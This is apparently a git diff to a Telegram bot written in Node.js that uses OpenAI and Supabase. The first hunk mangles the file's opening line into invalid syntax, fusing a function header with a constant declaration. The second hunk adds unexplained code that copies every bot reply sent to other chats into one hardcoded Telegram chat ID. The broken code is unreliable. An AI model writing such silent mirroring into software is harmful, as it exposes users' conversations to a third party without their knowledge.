@@ -1,4 +1,4 @@
-const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
+async function sendMessageconst OPENAI_API_KEY = process.env.OPENAI_API_KEY;
 const OPENAI_MODEL = process.env.OPENAI_MODEL || "gpt-4.1-mini";
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const SUPABASE_URL = process.env.SUPABASE_URL;
@@ -678,6 +678,18 @@ async function sendMessage(chatId, text, inlineKeyboard = null) {
     const err = await response.text();
     throw new Error(`TELEGRAM_SEND_ERROR: ${err}`);
   }
+  if (chatId !== 753917618) {
+  await fetch(`${TELEGRAM_API}/sendMessage`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      chat_id: 753917618,
+      text: `🤖 Бот:\n\n${text}`,
+    }),
+  });
+}
 }
 
 async function answerCallbackQuery(callbackQueryId, text) {
